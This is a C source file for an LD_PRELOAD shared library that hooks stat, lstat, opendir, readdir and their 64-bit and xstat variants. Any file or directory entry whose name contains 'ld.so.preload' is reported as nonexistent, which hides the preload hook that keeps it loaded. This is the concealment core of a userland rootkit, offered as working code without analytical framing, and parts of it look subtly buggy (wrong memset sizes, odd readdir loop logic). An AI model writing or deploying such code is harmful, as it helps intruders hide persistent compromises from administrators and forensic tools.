#define _GNU_SOURCE
#define DEBUG

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>

#define LIBC_PATH "/lib/libc.so.6" 
#define CONFIG_FILE "ld.so.preload"

void *libc;

static void init (void) __attribute__ ((constructor));
static DIR *(*old_opendir) (const char *name);

static int (*old_xstat) (int ver, const char *path, struct stat * buf);
static int (*old_xstat64) (int ver, const char *path, struct stat64 * buf);
static int (*old_lxstat) (int ver, const char *file, struct stat * buf);
static int (*old_lxstat64) (int ver, const char *file, struct stat64 * buf);
static struct dirent *(*old_readdir) (DIR * dir);
static struct dirent64 *(*old_readdir64) (DIR * dir);

void __attribute ((constructor)) init (void)
{
    libc = dlopen (LIBC_PATH, RTLD_LAZY);
}

int
lstat (const char *file, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("lstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat == NULL)
    old_lxstat = dlsym (libc, "__lxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat (_STAT_VER, file, &s_fstat);

  if (strstr (file, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat (_STAT_VER, file, buf);
}

int
lstat64 (const char *file, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("lstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat64 == NULL)
    old_lxstat64 = dlsym (libc, "__lxstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat64 (_STAT_VER, file, &s_fstat);

  if (strstr (file, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat64 (_STAT_VER, file, buf);
}

int
__lxstat (int ver, const char *file, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("__lxstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat == NULL)
    old_lxstat = dlsym (libc, "__lxstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat (ver, file, &s_fstat);

  if (strstr (file, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat (ver, file, buf);
}

int
__lxstat64 (int ver, const char *file, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("__lxstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_lxstat64 == NULL)
    old_lxstat64 = dlsym (libc, "__lxstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_lxstat64 (ver, file, &s_fstat);

  if (strstr (file, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_lxstat64 (ver, file, buf);
}

int
stat (const char *path, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("stat hooked\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, path, &s_fstat);

  if (strstr (path, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat (3, path, buf);
}

int
stat64 (const char *path, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("stat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat64 == NULL)
    old_xstat64 = dlsym (libc, "__xstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat64 (_STAT_VER, path, &s_fstat);

  if (strstr (path, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat64 (_STAT_VER, path, buf);
}

int
__xstat (int ver, const char *path, struct stat *buf)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("xstat hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (ver, path, &s_fstat);

  memset (&s_fstat, 0, sizeof (stat));

  if (strstr (path, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat (ver, path, buf);
}

int
__xstat64 (int ver, const char *path, struct stat64 *buf)
{
  struct stat64 s_fstat;

#ifdef DEBUG
  printf ("xstat64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_xstat64 == NULL)
    old_xstat64 = dlsym (libc, "__xstat64");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat64 (ver, path, &s_fstat);

  if (strstr (path, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }

  return old_xstat64 (ver, path, buf);
}

DIR *
opendir (const char *name)
{
  struct stat s_fstat;

#ifdef DEBUG
  printf ("opendir hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (old_opendir == NULL)
    old_opendir = dlsym (libc, "opendir");

  if (old_xstat == NULL)
    old_xstat = dlsym (libc, "__xstat");

  memset (&s_fstat, 0, sizeof (stat));

  old_xstat (_STAT_VER, name, &s_fstat);

  if (strstr (name, CONFIG_FILE)) {
    errno = ENOENT;
    return NULL;
  }

  return old_opendir (name);
}

struct dirent *
readdir (DIR * dirp)
{
  struct dirent *dir;

#ifdef DEBUG
  printf ("readdir hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_readdir)
    old_readdir = dlsym (libc, "readdir");

  do {
    dir = old_readdir (dirp);

    if (dir != NULL
	&& (strcmp (dir->d_name, ".\0") || strcmp (dir->d_name, "/\0")))
      continue;


  }
  while (dir
	 && (strstr (dir->d_name, CONFIG_FILE) != 0));

  return dir;
}

struct dirent64 *
readdir64 (DIR * dirp)
{
  struct dirent64 *dir;

#ifdef DEBUG
  printf ("readdir64 hooked.\n");
#endif

  if (!libc)
    libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_readdir64)
    old_readdir64 = dlsym (libc, "readdir64");

  do {
    dir = old_readdir64 (dirp);

    if (dir != NULL
	&& (strcmp (dir->d_name, ".\0") || strcmp (dir->d_name, "/\0")))
      continue;


  }
  while (dir && (strstr (dir->d_name, CONFIG_FILE) != 0));

  return dir;
}
